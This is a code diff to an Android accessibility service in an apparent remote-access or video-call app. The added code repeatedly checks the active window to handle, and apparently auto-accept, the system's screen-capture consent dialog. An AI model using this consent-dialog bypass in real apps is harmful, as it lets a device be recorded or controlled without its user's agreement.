@@ -23,6 +23,26 @@ public class RemoteAccessibilityService extends AccessibilityService {
 
     public static void setAutoAcceptPending(boolean pending) {
         sAutoAcceptPending = pending;
+        if (pending && sInstance != null) {
+            sInstance.scheduleAutoAcceptCheck(0);
+        }
+    }
+
+    private void scheduleAutoAcceptCheck(int attempt) {
+        if (!sAutoAcceptPending || attempt > 25) return;
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            if (!sAutoAcceptPending) return;
+            try {
+                android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    processMediaProjectionDialog(root);
+                    root.recycle();
+                }
+            } catch (Exception ignored) {}
+            if (sAutoAcceptPending) {
+                scheduleAutoAcceptCheck(attempt + 1);
+            }
+        }, 250);
     }
 
     public static RemoteAccessibilityService getInstance() {
@@ -102,10 +122,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
                         stopService(serviceIntent);
                         if (MainActivity.getInstance() != null) {
                             MainActivity.getInstance().runOnUiThread(() -> {
-                                if (MainActivity.getInstance().getWebRTCCompanion() != null) {
-                                    MainActivity.getInstance().getWebRTCCompanion().endCall(false);
-                                }
-                                MainActivity.getInstance().moveTaskToBack(true);
+                                MainActivity.getInstance().stopAllMediaAndFinish();
                             });
                         }
                     } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
